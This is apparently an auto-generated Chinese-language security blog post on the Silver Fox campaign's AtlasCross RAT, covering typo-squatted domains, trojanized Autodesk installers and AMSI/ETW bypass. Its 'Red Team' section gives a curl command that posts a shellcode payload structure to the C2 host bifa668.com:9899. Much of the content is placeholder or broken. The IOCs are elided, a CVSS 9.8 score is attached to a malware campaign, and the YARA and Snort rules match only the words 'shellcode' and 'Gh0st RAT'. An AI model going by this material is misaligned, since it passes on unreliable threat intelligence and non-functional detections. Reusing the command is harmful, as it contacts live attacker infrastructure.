---
layout: post
title:  "Silver Fox Expands Asia Cyber Campaign with AtlasCross RAT and Fake Domains"
date:   2026-03-31 13:01:02 +0000
categories: [security]
severity: critical
---

# 🚨 解析 AtlasCross RAT：中國語言用戶面臨的新型遠程存取木馬
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `PowerChell` 框架、`ChaCha20` 加密、`AMSI` 和 `ETW` 繞過

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: AtlasCross RAT 利用了中國語言用戶對知名軟件品牌的信任，通過 typo-squatted 網域和假冒的下載包來傳播。
* **攻擊流程圖解**:
  1. 用戶訪問假冒網域，下載 ZIP 檔案。
  2. ZIP 檔案包含一個 trojanized Autodesk 安裝包和一個合法的應用程序。
  3. 安裝包啟動一個 shellcode 加載器，解密嵌入的 Gh0st RAT 配置文件。
  4. shellcode 加載器從 `bifa668[.]com` 下載第二階段 shellcode 並執行 AtlasCross RAT。
* **受影響元件**: Autodesk 軟件、多個知名軟件品牌的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 網路連接、用戶信任。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload 結構
      payload = {
        'type': 'shellcode',
        'data': '...shellcode 資料...',
        'config': '...Gh0st RAT 配置文件...'
      }
    
    ```
 

```

bash
  # 範例指令
  curl -X POST -H "Content-Type: application/json" -d '{"type": "shellcode", "data": "...shellcode 資料...", "config": "...Gh0st RAT 配置文件..."}' http://bifa668.com:9899

```
* **繞過技術**: AtlasCross RAT 使用 `PowerChell` 框架繞過 `AMSI` 和 `ETW`。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `...hash 值...` |
| IP | `...IP 地址...` |
| Domain | `bifa668[.]com` |
| File Path | `...文件路徑...` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule AtlasCross_RAT {
        meta:
          description = "AtlasCross RAT"
          author = "..."
        strings:
          $a = "shellcode"
          $b = "Gh0st RAT"
        condition:
          all of them
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"AtlasCross RAT"; content:"shellcode"; sid:1000001;)

```
* **緩解措施**: 更新 Autodesk 軟件、禁用不必要的網路連接、使用防病毒軟件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **PowerChell**: 一個原生 C/C++ PowerShell 執行引擎，允許在惡意軟件進程中直接宿主 .NET CLR。
* **ChaCha20**: 一種流加密算法，使用於 AtlasCross RAT 的 C2 通信加密。
* **AMSI (Antimalware Scan Interface)**: 一個 Windows API，允許防病毒軟件掃描和阻止惡意軟件。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/silver-fox-expands-asia-cyber-campaign.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


